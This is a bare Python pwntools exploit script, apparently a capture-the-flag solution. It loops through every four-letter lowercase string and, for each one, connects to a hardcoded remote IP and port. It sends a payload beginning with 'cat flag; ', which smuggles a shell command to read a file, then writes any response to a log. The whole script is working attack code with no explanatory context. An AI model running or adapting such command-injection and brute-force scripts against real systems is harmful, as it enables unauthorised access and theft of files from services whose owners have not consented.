#!/usr/bin/env python2

from pwn import *
from string import ascii_lowercase
from itertools import product
#context.log_level="DEBUG"
context.log_level="ERROR"
#rand = sys.argv[1]
f = open("log", "w")
cmd = "cat flag; "
it = product(ascii_lowercase, repeat=4)
for r in it:
    t = ''.join(r)
    #print(t)
    r = remote("54.202.2.54", 9876)
    #r = process("sss")
    r.recvuntil("_ ")
    r.send("2")
    r.recvuntil("_ ")
    s = cmd + t
    while len(s) < 0x100:
        s += 'a'

    r.send(s)
    r.recvuntil("_ ")
    r.send("312321321")
    res= r.recvall(timeout=1)
    if len(res) != 0:
        print(res)
        f.write(res)
        f.write("\n")
    r.close()
